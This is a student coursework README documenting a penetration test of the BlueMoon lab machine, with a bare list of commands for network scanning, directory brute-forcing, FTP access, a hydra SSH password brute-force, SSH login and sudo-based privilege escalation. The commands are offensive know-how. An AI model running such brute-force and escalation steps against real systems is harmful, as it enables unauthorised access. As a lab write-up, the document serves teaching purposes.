# BlueMoon Vulnerability Analysis

This project is part of the Vulnerability Analysis course (IKB21403).

Student Name: Haziq Danial Bin Nor Azan  
Student ID: 52215225213

## Objective
To perform vulnerability analysis and penetration testing on the BlueMoon machine.

## Tools Used
- Nmap
- Dirb
- FTP
- Hydra
- SSH

## Steps

### 1. Network Configuration
Command used:
ifconfig

### 2. Network Scan
nmap -sn 192.168.56.0/24

### 3. Service Detection
nmap -sC -sV -Pn -vv 192.168.56.104

### 4. Directory Bruteforce
gobuster dir -u http://192.168.56.104 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

### 5. Hidden Page Discovery
http://192.168.56.104/hidden_text

### 6. FTP Access
ftp 192.168.56.104

### 7. Password Attack
hydra -l robin -P p_lists.txt ssh://192.168.56.104

### 8. SSH Login
ssh robin@192.168.56.104

### 9. Privilege Escalation
sudo -l
sudo -u jerry /home/robin/project/feedback.sh
